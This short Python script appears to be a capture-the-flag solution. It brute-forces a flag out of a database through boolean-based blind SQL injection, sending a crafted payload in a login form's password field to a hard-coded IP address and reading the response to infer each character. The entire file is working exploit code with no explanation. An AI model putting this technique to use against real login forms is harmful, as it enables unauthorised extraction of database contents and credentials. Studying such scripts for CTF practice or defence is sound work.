import requests
url = 'http://124.71.239.155:24370/'

def trans(flag):
    res = ''
    for i in flag:
        res += hex(ord(i))
    res = '0x' + res.replace('0x','')
    return res

flag = ''
for i in range(1,500):
    hexchar = ''
    for char in range(32, 126):
        hexchar = trans(flag+ chr(char))
        payload = 'aaa\') or ((select 1,{},3)>(select * from flag limit 0,1)) #'.format(hexchar)
        data = {
                'uname':'a',
                'passwd':payload
                }
        r = requests.post(url=url, data=data)
        text = r.text
        #print(text)
        if 'login</font>' in r.text:
            flag += chr(char-1)
            print(flag)
            break